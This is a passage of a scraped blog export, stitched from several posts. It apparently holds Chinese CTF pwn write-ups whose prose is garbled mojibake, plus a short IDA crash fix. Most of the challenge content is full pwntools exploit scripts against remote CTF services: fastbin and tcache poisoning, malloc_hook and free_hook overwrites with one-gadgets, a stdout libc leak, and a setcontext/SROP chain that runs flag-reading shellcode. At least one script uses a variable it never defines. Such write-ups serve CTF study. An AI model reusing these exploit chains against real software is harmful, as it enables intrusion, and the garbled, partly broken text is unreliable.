ä¸€ä¸ª0x70çš„å †ï¼Œç„¶åfastbin attackå³å¯ç”³è¯·åˆ°è¿™æ ˆä¸Šçš„å†…å­˜ã€‚ç„¶åå¡«å……ï¼Œè·å–libcåœ°å€ã€‚æ¥ç€æ”»å‡»malloc hookå³å¯ã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './mmutag' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('183.129.189.61',55704) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def input_introduce(data): sla('your introduce',str(data)) def add(idx,data): sla('ise','1') sla('id',str(idx)) sa('tent',str(data)) def free(idx): sla('ise','2') sla('id',str(idx)) data = '1' * 0x60 sa('name',data) ru('0x') leak_libc = int(r(12),16) sla('ice','2') add(1,'chumen77') add(2,'chumen77') free(1) free(2) free(1) sla('ise','3') payload = p64(0) + p64(0x70) + p64(0) s(payload) add(4,p64(leak_stack - 0x40)) add(5,'1') add(6,'1') add(7,'1' * 0x47 + '2') sla('ise','3') s('1' * 0x20) info_addr('leak-stack',leak_stack) ru('2') libc_base = uu64(r(6)) - 0x20840 info_addr('libc_base',libc_base) free(1) free(2) free(1) malloc_hook = 0x3c4aed + libc_base add(3,p64(malloc_hook)) add(8,'1') add(9,'1') one = 0xf0364 + libc_base payload = (3 + 0x10) * '\\x00' + p64(one) add(10,payload) free(3) free(3) # debug() itr() æœ€åå› ä¸ºæ²¡æœ‰å †å¯ä»¥ç”³è¯·ï¼Œå¯ä»¥æ•…æ„è§¦å‘æŠ¥é”™ï¼Œå…¶ä¼šè°ƒç”¨åˆ°mallocæ¥å‚¨å­˜éƒ¨åˆ†æ•°æ®ï¼Œæ­¤æ—¶ä¹Ÿå°±å¯ä»¥get shellã€‚ ezhttpçœ‹èµ·æ¥è¾ƒä¸ºå¤æ‚ï¼Œå› ä¸ºå®ç°äº†ä¸€ä¸ªå¯¹Http packetçš„äº¤äº’ï¼Œè®©æˆ‘è¿™ç§ä¸æ˜¯å¾ˆç†Ÿæ‚‰http packetï¼Œcodingèƒ½åŠ›å·®çš„äººï¼Œé€†å‘èµ·æ¥æœ‰ç‚¹åƒåŠ›ã€‚ åˆ†æå‰ç½®æŠ€èƒ½ ç®€æ˜“çš„Http packetç»“æ„ setcontext å‡½æ•°çš„exploit å„ç§ä¸ç†Ÿæ‚‰çš„å­—ç¬¦ä¸²å¤„ç†å‡½æ•°sscanf strchr strtok ç¨‹åºåˆ†æ å¼€å¤´åˆå§‹åŒ–ï¼Œå¼€å¯äº†æ²™ç®±ï¼Œåªèƒ½orwæ¥è·å–flag addå‡½æ•°ï¼Œä»¥è¾“å…¥çš„å­—ç¬¦æ•°é‡æ¥ç»™ä½ åˆ†é…å †ï¼Œæ‰€ä»¥\\x00ç”¨ä¸äº†äº†ï¼Œæœ€å¤§0x100ï¼Œä¸”ç»™äº†heapçš„åœ°å€ del å‡½æ•°ï¼Œå­˜åœ¨uaf æ— showå‡½æ•° editå‡½æ•°ï¼Œå¯ä»¥è¾“å…¥\\x00çš„å­—ç¬¦ï¼Œæ— vul æ”»å‡»æ€è·¯ free 0x100çš„chunk 8æ¬¡ï¼Œä½¿å…¶è¿›å…¥unsortbinï¼Œç•™ç€æ”»å‡»stdout tcache attack æ”»å‡»åˆ°_IO_2_1_stdout_ ï¼Œä½¿å…¶æ³„æ¼libcåœ°å€ tcache attack æ”»å‡»free hookï¼Œå†™ä¸Šsetcontext + 53 ï¼Œå‡†å¤‡sropè¿›è¡Œæ”»å‡» sropè¯»å…¥mprotectçš„rop chainï¼Œå¼€å¯heapæ®µçš„æ‰§è¡Œæƒé™ edit ä¸€ä¸ªheapçš„å†…å­˜ä¸º orw flag è§¦å‘free hookï¼Œorw get flag ç»†èŠ‚é›†åˆå¯¹äºstdoutçš„æ”»å‡»å…¶ä¸­ï¼Œåœ¨åˆ©ç”¨libcæ®‹ç•™ä¼ªé€ stdoutåœ°å€ä½œä¸ºfdçš„æ—¶å€™ï¼Œåªè¦æ”¹3å­—èŠ‚ï¼Œå…¶è‚¯å®šæ˜¯ç”³è¯·çš„0x20çš„å †ï¼Œä½†æ˜¯ä¸Šstdoutç»“æ„ä½“æ—¶éœ€è¦0x21å­—èŠ‚çš„å†™å…¥ã€‚tcacheåˆ†é…ä¸­ï¼Œå¹¶ä¸éªŒè¯å †çš„å¤§å°ï¼Œåªè¦fdæŒ‡å¥½å°±OKäº†ï¼Œæ‰€ä»¥ç”³è¯·ä¸ªè‡³å°‘å¯ä»¥å†™å…¥0x21å­—èŠ‚çš„å †å³å¯ã€‚ä½†æ˜¯ç”±äºç¨‹åºåˆ†é…chunkçš„ç­–ç•¥ï¼Œç”³è¯·æ—¶è‚¯å®šè¦å†™æ•°æ®ï¼Œå†™ä»€ä¹ˆä¸ä¼šcrushã€‚ä¸ªäººåšçš„æ—¶å€™,ä¹±å¡«å……æ•°æ®ï¼Œcrushäº†å¾ˆå¤šæ¬¡ï¼Œå¤´éƒ½ç‚¸äº†ã€‚å¯ä»¥çœ‹ä¸€ä¸‹_IO_2_1_stdout_ç»“æ„ä½“ï¼š pwndbg&gt; ptype stdout type = struct _IO_FILE &#123; int _flags; char *_IO_read_ptr; char *_IO_read_end; char *_IO_read_base; char *_IO_write_base; char *_IO_write_ptr; char *_IO_write_end; char *_IO_buf_base; char *_IO_buf_end; char *_IO_save_base; char *_IO_backup_base; char *_IO_save_end; struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock; __off64_t _offset; struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf; size_t __pad5; int _mode; char _unused2[20]; &#125; * åœ¨å­¦ä¹ io fileç›¸å…³çŸ¥è¯†æ—¶ï¼Œå¯ä»¥äº†è§£åˆ°å¯¹äºè·å–å’Œè¾“å‡ºä¿¡æ¯ï¼Œå¾ˆé‡è¦çš„å°±æ˜¯å¼€å¤´_flags ï¼Œå…¶å†³å®šäº†æ­¤æ—¶ioçš„çŠ¶å†µã€‚ å…¶ä¸­æ³¨æ„åˆ°_flags å¤§å°æ˜¯intå‹ï¼Œæ‰€ä»¥åœ¨libcåœ°å€å…¶è¯»å–å’ŒéªŒè¯å°†è¦åšä»€ä¹ˆæ—¶ï¼Œæ˜¯ä»¥intçš„å®½åº¦æ¥è·å–çš„ã€‚æ‰€ä»¥è®¾ç½®å¯¹ä½ä½8å­—èŠ‚å³å¯ã€‚æ¯”å¦‚0xfffffffffbad3c80 0x12345678fbad3c80 ,å‰©ä¸‹çš„å°±å¥½è¯´äº†ï¼Œå…¨å¼„æˆaçš„åƒåœ¾å­—ç¬¦å †ã€‚ ç„¶åå†æ¬¡editï¼Œè¿™ä¸ª_IO_2_1_stdout_å³å¯æ³„æ¼å‡ºlibcåœ°å€ã€‚ æ”¹free hookå†™setcontextæ—¶çš„ç»†èŠ‚å…¶ä¸­éœ€è¦æ³¨æ„ä¸€ä¸‹libcç‰ˆæœ¬ï¼Œåœ¨æœ€ä½çš„libc 2.27ç‰ˆæœ¬ä¸­ï¼Œå…¶ç»å¸¸æ˜¯ä»¥0xXXXXXXX00a0è¿™æ ·çš„å­˜åœ¨ã€‚ç›´æ¥æ”¹å†™æ—¶ï¼Œ/x00è¢«æˆªæ–­ï¼Œå†™ä¸ä¸Šfree hookã€‚ç„¶åæƒ³ç€ç”¨edit è¿›è¡Œä¿®æ”¹ã€‚ä½†æ˜¯ä¼šå‘ç°ï¼Œæ­¤æ—¶åçš„free hookæƒ…å†µä¸‹ï¼Œç”¨editç›´æ¥crushã€‚ è€ƒè™‘å‡çº§ä¸€ä¸‹libcç‰ˆæœ¬å·å¯¹åº”å¯¹èµ›é¢˜æœåŠ¡å™¨çš„libcç‰ˆæœ¬ï¼Œä½†æ˜¯libc2.27æœ€è¿‘æ›´æ–°äº†ï¼Œç›´æ¥apt upgrade libc6 å°±ä¼šå‡çº§åˆ°libc 2.27:1.3æœ€æ–°ç‰ˆæœ¬ï¼Œå…¶å¢åŠ äº†å¯¹double freeçš„æ£€æµ‹ï¼Œå°±ç›´æ¥åšä¸äº†äº†ã€‚ apt æŒ‡å®šç‰ˆæœ¬çš„å‡çº§ï¼š apt-cache madison libc6 apt-get install libc6=2.27-3ubuntu1.2 apt-cache madison libc6-dbg apt-get install libc6-dbg=2.27-3ubuntu1.2 è¿™æ ·å°±å‡çº§å¥½äº†ï¼Œå¹¶ä¸”è§£å†³äº†ä¸ªäººå†™setcontextçš„é—®é¢˜ï¼Œå› ä¸ºå…¶åœ°å€æ²¡æœ‰å†æœ‰``x00 ### exp ```python #!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = &apos;./ezhttp&apos; elf = ELF(local_file) context.log_level = &apos;debug&apos; debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote(&apos;172.17.0.2&apos;,23946) libc = elf.libc #libc = ELF(&apos;.&apos;) context.arch = elf.arch context.terminal = [&apos;tmux&apos;,&apos;neww&apos;] #,&apos;&apos;splitw&apos;,&apos;-h&apos; arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, &apos;\\0&apos;)) uu64 = lambda data :u64(data.ljust(8, &apos;\\0&apos;)) info_addr = lambda tag, addr :io.info(tag + &apos;==&gt;&apos; +&apos;: &#123;:#x&#125;&apos;.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript=&apos;b main&apos;) gdb.attach(io) pause() # debug() def add(data): content = &apos;POST\\n&apos; content += &apos;/create \\nCookie: user=admin token: \\r\\n\\r\\n&apos; content += &apos;content=&apos;+str(data) ru(&apos;Send Http packet to me:&apos;) s(str(content)) sleep(0.05) def free(index): content = &apos;POST\\n&apos; content += &apos;/del \\nCookie: user=admin token: \\r\\n\\r\\n&apos; content += &apos;index=&apos;+str(index) ru(&apos;Send Http packet to me:&apos;) s(str(content)) def edit(idx,data): content = &apos;POST\\n&apos; content += &apos;/edit \\nCookie: user=admin token: \\r\\n\\r\\n&apos; content += &apos;index=&apos;+ str(idx) + &apos;&amp;content=&apos;+str(data)+ &apos;\\n&apos; s(str(content)) sleep(0.05) def leak_addr(): payload = &apos;1&apos; *0x100 add(payload) ru(&apos;0x&apos;) heap_base = int(r(12),16) - 0x10 info_addr(&apos;heap_base&apos;,heap_base) add(payload) add(&apos;1&apos;*0x8) add(&apos;1&apos;*0xf8) for i in range(7): free(0) free(0) add(&apos;\\x60\\xa7&apos;) add(&apos;1&apos;*0x18) add(&apos;1&apos;*0x20) free(6) free(6) add(&apos;1&apos;*0x20) payload = p64(heap_base + 0x10) edit(7,payload) add(&apos;1&apos;*0x20) # debug() add(&apos;1&apos;*0x20) sleep(0.1) payload = p64(0x12345678fbad3c80) + &apos;\\x01&apos; *0x20 add(payload) #8 payload = p64(0xfbad3c80) + p64(0) * 3 + &apos;\\x00&apos; edit(10,payload) add(&apos;1&apos;*0x90) return heap_base leak = 0 while True: try: heap_base = leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception(&apos;&apos;) io.recv(16) leak = u64(io.recv(8)) if leak == 0x320a6464412e310a: raise Exception(&apos;&apos;) break except Exception: io.close() io = process(&apos;./ezhttp&apos;) continue leak = leak &gt;&gt; 16 info_addr(&apos;leak&apos;,leak) libc_base = leak - 0x3eb780 info_addr(&apos;libc_base&apos;,libc_base) free_hook = 0x3ed8e8 + libc_base set_context = libc.sym[&apos;setcontext&apos;] + 53 + libc_base info_addr(&apos;heap_base&apos;,heap_base) info_addr(&apos;context&apos;,set_context) orw = shellcraft.open(&apos;./flag&apos;) orw +=shellcraft.read(&apos;rax&apos;,heap_base+0x300,0x30) orw +=shellcraft.write(1,heap_base+0x300,0x30) edit(11,asm(orw)) # debug() frame = SigreturnFrame() frame.rdi = 0 frame.rsi = free_hook frame.rdx = 0x300 frame.rsp = free_hook frame.rip = libc_base + libc.search(asm(&quot;syscall \\nret&quot;)).next() edit(1,str(frame)) free(2) free(2) free(2) # debug() add(p64(free_hook)) add(&apos;1&apos;*6) info_addr(&apos;context&apos;,set_context) add(p64(set_context)) # debug() free(1) pop_rdi = 0x000000000002155f+libc_base pop_rsi = 0x0000000000023e8a+libc_base pop_rdx = libc_base+0x0000000000001b96 pop_rax = libc_base+0x0000000000043a78 payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&apos;mprotect&apos;],heap_base+0x80]) s(payload) itr()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"}]},{"title":"mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•","slug":"mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•","date":"2020-10-06T14:37:29.022Z","updated":"2020-10-09T00:22:47.125Z","comments":true,"path":"2020/10/06/mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•/","link":"","permalink":"http://chumen77.xyz/2020/10/06/mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•/","excerpt":"","text":"mac ä¸Šida 7.0 é—ªé€€ æ‰“ä¸å¼€ è§£å†³åŠæ³•æƒ…æ™¯1ä¸‹è½½ä»¥åç›´æ¥ä¸èƒ½ç”¨çš„ã€‚ https://github.com/fjh658/IDA7.0_SP https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15 å‚è€ƒè¿™ä¸ªä¸¤ä¸ªgithubçš„é¡¹ç›®å³å¯ã€‚ æƒ…æ™¯2å¹³æ—¶æ­£å¸¸ä½¿ç”¨ï¼Œçªç„¶å› ä¸ºè£…äº†å†²çªçš„æ’ä»¶æ‰“ä¸å¼€idaï¼Œç›´æ¥crashã€‚æˆ–è€…è«åç‚¹å‡»idaå›¾æ ‡å°±æ²¡æœ‰ä»»ä½•ååº”ã€‚è¿›å…¥ida.app bin ä¸‹çš„idaï¼ŒåŒå‡»æ‰§è¡Œå‘½ä»¤è¡Œä¸­ï¼Œä¼šæ˜¾ç¤ºå†…æ ¸é”™è¯¯çš„æƒ…å†µã€‚ ~ cd .idapro ~/.idapro rm -rf ida.reg è¿™æ ·å°±å¯ä»¥è§£å†³äº†ã€‚","categories":[],"tags":[{"name":"æ‚é¡¹","slug":"æ‚é¡¹","permalink":"http://chumen77.xyz/tags/æ‚é¡¹/"}]},{"title":"BUUCTF åˆ·é¢˜è®°å½•","slug":"BUUCTFåˆ·é¢˜è®°å½•","date":"2020-09-28T11:24:58.046Z","updated":"2020-10-21T11:36:10.414Z","comments":true,"path":"2020/09/28/BUUCTFåˆ·é¢˜è®°å½•/","link":"","permalink":"http://chumen77.xyz/2020/09/28/BUUCTFåˆ·é¢˜è®°å½•/","excerpt":"","text":"BUUCTFåˆ·é¢˜è®°å½•GKCTF 2020 demoåˆ†æå¼€å¯äº†æ²™ç®±ï¼Œä¸è¿‡åœ¨mainå‡½æ•°çš„æœ€åï¼Œåœ¨whileå¾ªç¯é‡ŒåšåŠ¨ä½œå°±ä¸ä¼šè§¦å‘åˆ°ã€‚å…¶ä¸­addå’Œfree å‡½æ•°ï¼Œä¸Šæ¥éƒ½ä¼šæ£€æµ‹free_hook malloc_hook æ˜¯å¦ä¸ä¸º0ï¼Œä¸ä¸º0å°±ä¸è®©è¿›è¡Œç›¸åº”çš„æ“ä½œã€‚ æ¼æ´ç‚¹if ( (nbytes &amp; 0x80000000) == 0LL &amp;&amp; nbytes &lt;= 0x120 ) &#123; heaplist[SHIDWORD(nbytes)] = malloc(nbytes); puts(\"content:\"); read(0, heaplist[SHIDWORD(nbytes)], nbytes); *(heaplist[SHIDWORD(nbytes)] + nbytes) = 0;// off by null ++counts; &#125; Addä¸­å­˜åœ¨OFF BY NULLã€‚ æ”»å‡»æ€è·¯ åˆ©ç”¨off by null æ„é€ ä¸€ä¸ªå †é‡å  æ³„æ¼å‡ºlibcåœ°å€ 2æ¬¡é‡Šæ”¾é‡å çš„chunkï¼Œè¿›è¡Œfastbin attack malloc_hook_ä¸º one gadget é€šè¿‡è¯»å…¥choiceçš„scanfå‡½æ•°ï¼Œä¼ é€å¤§é‡å­—èŠ‚ï¼Œå…¶ä¼šè°ƒç”¨mallocç”³è¯·chunkï¼Œå³å¯get shell expfrom pwn import * import time local_file = './domo' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27019) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ''' line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff if (A != 0xffffffff) goto 0009 0005: 0x15 0x03 0x00 0x0000000a if (A == mprotect) goto 0009 0006: 0x15 0x02 0x00 0x0000003b if (A == execve) goto 0009 0007: 0x15 0x01 0x00 0xffffd8b6 if (A == 0xffffd8b6) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0009: 0x06 0x00 0x00 0x00000000 return KILL ''' def add(size,data): sla('&gt;','1') sla('size',str(size)) sa('tent',str(data)) def free(idx): sla('&gt;','2') sla('dex',str(idx)) def show(idx): sla('&gt;','3') sla('dex',str(idx)) add(0x80,'1') add(0x68,'1') add(0xf0,'1') add(0x10,'1') free(1) free(0) data = '\\x00'*0x60+p64(0x100) add(0x68,data) free(2) add(0x80,'\\x00') add(0x68,'\\x00') add(0xf0,'1') add(0x68,'1') add(0x18,'1') free(2) free(5) free(0) show(4) r() libc_base = uu64(r(6)) - 0x3c4b31 info_addr('libc_base ',libc_base) malloc_hook=libc_base+libc.symbols['__malloc_hook'] realloc_hook=libc_base+libc.symbols['realloc'] add(0x68,p64(malloc_hook-0x23)) add(0x68,p64(malloc_hook-0x23)) add(0x68,p64(malloc_hook-0x23)) onegadget = 0x4526a + libc_base data = '\\x00'*0xb+p64(onegadget)+ p64(realloc_hook+realloc[0]) add(0x68,data) sla('&gt;','1'*500) # debug() itr() åè®° è¿˜å¯ä»¥æ”»å‡»calloc_hook,å› ä¸ºseccompé‡Œé¢è°ƒç”¨äº†callocã€‚ æ”»å‡»io file è¿›è¡Œæ³„æ¼å’Œorwã€‚ï¼ˆå…ˆç­‰å¾…å¤ç°ï¼‰https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py gyctf_2020_signinåˆ†æ uafï¼Œä½†æ˜¯å­˜åœ¨ä¸€ä¸ªflagä½ç”¨äºæ£€æµ‹æ˜¯å¦freeè¿‡ editåªèƒ½ä¸€æ¬¡ å­˜åœ¨åé—¨å‡½æ•°ï¼Œå…¶ä¸­è¿˜ä¼šç”¨callocç”³è¯·ä¸€ä¸ªchunk,å¹¶ä¸”åªéœ€è¦0x004040C0å¤„æœ‰æ•°å€¼å³å¯è§¦å‘ã€‚ å‰ç½®çŸ¥è¯†calloc çš„ç‰¹æ€§ï¼š åœ¨ç”³è¯·åˆ°çš„chunkä¸Šä¼šè¿›è¡Œä¸€ä¸ªç½®é›¶çš„æ“ä½œ ä¸ä¼šä»tcache bin ä¸­å–chunk tcache çš„_int_mallocæœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š åœ¨åˆ†é… fastbin ä¸­çš„ chunk æ—¶ï¼Œè‹¥æ­¤chainä¸Šè¿˜æœ‰å…¶ä»–chunk ï¼Œåˆ™è°ƒç”¨tcache_putæŠŠå®ƒä»¬å…¨éƒ¨æ”¾å…¥ tcache ä¸­(smallbinsä¸­ä¹Ÿæ˜¯å¦‚æ­¤)ã€‚ /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (pp = *fb) != NULL) &#123; REMOVE_FB (fb, tc_victim, pp); if (tc_victim != 0) &#123; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125; æ”»å‡»æ€è·¯ ç”³è¯·8ä¸ªå †ï¼Œ é‡Šæ”¾8ä¸ªå †ï¼Œæœ€åä¸€ä¸ªä¼šè¿›å…¥fastbin edit idx=8 çš„chunkï¼Œæ”¹å…¶fdä¸º0x004040C0 - 0x10 ç”³è¯·ä¸€ä¸ªchunkï¼Œæ­¤æ—¶ä¼šåœ¨tcache chainä¸­æ‹¿èµ°ä¸€ä¸ªï¼Œç•™å‡ºä¸€ä¸ªç©ºä½ è°ƒç”¨åé—¨å‡½æ•°ï¼Œå…¶ä¸­callocä¼šä»fastbinä¸­æ‹¿å‡ºidx=8çš„chunkï¼Œä½†æ˜¯ç”±äºå…¶ç‰¹æ€§ï¼Œä¼šæŠŠå‰©ä¸‹çš„fdä¸Šåœ°å€ä¹Ÿå½“ä½œä¸€ä¸ªchunkä¸¢è¿›tcache ä¸¢è¿›æ—¶æ˜¯ä¸¢åœ¨tcacheçš„å¤´éƒ¨ï¼Œæ‰€ä»¥ä¼šè·Ÿtcache è¿›è¡Œä¸€ä¸ªlinkã€‚ä¹Ÿå°±æ˜¯ä¼šåœ¨è¿™ä¸ªfdåœ°å€ä¸Šå†™ä¸‹ï¼Œtcache chain ä¸Šå…¶ç´§æŒ¨ç€çš„chunkåœ°å€ã€‚è¿™å°±é€ æˆä¸€ä¸ªä»»æ„åœ°å€å†™ã€‚ æ¼æ´äº§ç”ŸåŸå› ä¹Ÿæ˜¯ï¼Œlibcæºç ä¸­tcache_putåŸºæœ¬æ²¡æœ‰å®‰å…¨æ£€æŸ¥ã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './gyctf_2020_signin' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27592) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx): sla('your choice?','1') sla('idx',str(idx)) def edit(idx,data): sla('your choice?','2') sla('idx',str(idx)) s(str(data)) def free(idx): sla('your choice?','3') sla('idx',str(idx)) for i in range(8): add(i) for i in range(8): free(i) edit(7,p64(0x4040C0-0x10)) add(8) sla('your choice?','6') debug() itr() é¢˜è®°åœ¨åšçš„æ—¶å€™ï¼Œå¼€å§‹æœ‰ä¸ªæƒ³æ³•ï¼Œmallocç”³è¯·å †æ—¶ï¼Œä¼šåœ¨å…¶è¿”å›åœ°å€çš„ä¸Šæ–¹ç•™ä¸‹sizeä¿¡æ¯ï¼Œä»¥æ­¤æ¥åˆ©ç”¨ã€‚ä½†æ˜¯åœ¨éªŒè¯åï¼Œå‘ç°æ˜¯ä¸ä¼šçš„ã€‚ gyctf_2020_documentåˆ†æ å­˜åœ¨uafæ¼æ´ åªèƒ½ç”³è¯·ä¸€ä¸ª0x20ã€0x90çš„å †å—ï¼Œä¸èƒ½è¿›è¡Œfastbinè¿›è¡Œæ”»å‡»ã€‚ personæ•°æ®ç»“æ„ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â” â”‚ â”‚0x21â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”¤ â”‚ â”‚ â”‚ â”‚ main_heap â”‚ flag â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ 0x91â”‚ â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ â”‚ â”œâ”€â”€â”€â”€â”€â”€â–¶0x10 â”‚ name â”‚ sex â”‚ â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ data â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â” â”‚ â”œâ”€â”€â”€â”€â”€â”€â–¶â”‚0x80â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”˜ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ æ”»å‡»æ€è·¯ é‡Šæ”¾ä¸€ä¸ª0x90çš„å †ï¼Œåˆ©ç”¨uafè¿›è¡Œæ³„æ¼libc ç”³è¯·2ä¸ªå †ï¼Œæ­¤æ—¶åœ¨è¿™ä¸ª0x90çš„unsortbinä¼šç•™ä¸‹2ä¸ª0x20çš„personæ•°æ®ç»“æ„çš„å¤´ editè¿™ä¸ªé‡Šæ”¾çš„å †ï¼Œæ§åˆ¶å…¶ä¸­main_heapçš„åœ°å€ï¼Œç„¶åè¿›è¡Œä»»æ„åœ°å€å†™ã€‚ exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './gyctf_2020_document' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25009) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(name,sex,data): sla('choice','1') sa('name',str(name)) sa('sex',str(sex)) sa('infor',str(data)) def show(idx): sla('choice','2') sla('index',str(idx)) def edit(idx,sex,data): sla('choice','3') sla('dex',str(idx)) sa('sex',str(sex)) sa('infor',str(data)) def free(idx): sla('choice','4') sla('index',str(idx)) data = '1' * 0x78 